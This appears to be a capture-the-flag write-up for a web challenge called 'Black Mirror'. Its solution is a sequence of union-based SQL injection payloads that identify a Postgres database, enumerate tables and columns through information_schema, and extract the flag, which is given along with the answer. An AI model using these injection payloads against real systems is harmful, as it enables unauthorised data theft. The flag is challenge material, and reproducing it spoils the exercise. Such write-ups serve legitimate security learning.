# Black Mirror

Solved by: @benkyou

### Question:
I'm a big fan of black mirror.

Note: Make sure to check the comments of homepage!

https://blackmirror-chall.fmc.tf

### Solution:
- View source from [https://blackmirror-chall.fmc.tf/?view-source](https://blackmirror-chall.fmc.tf/?view-source "https://blackmirror-chall.fmc.tf/?view-source")
- database is postgres `") union select null,null,version(),null -`
- table is FLAG_a2a123a31c1193359f2c96a9 `") union select null,null,table_name,null from information_schema.tables -`
- column is flag `") union select null,null,column_name,null from information_schema.columns where table_name='FLAG_a2a123a31c1193359f2c96a9' -`
- Get flag `") union select null,null,flag,null from FLAG_a2a123a31c1193359f2c96a9 -`

**Flag:** `FMCTF{674fc2c4d20858e922d14fff640a65f2}`


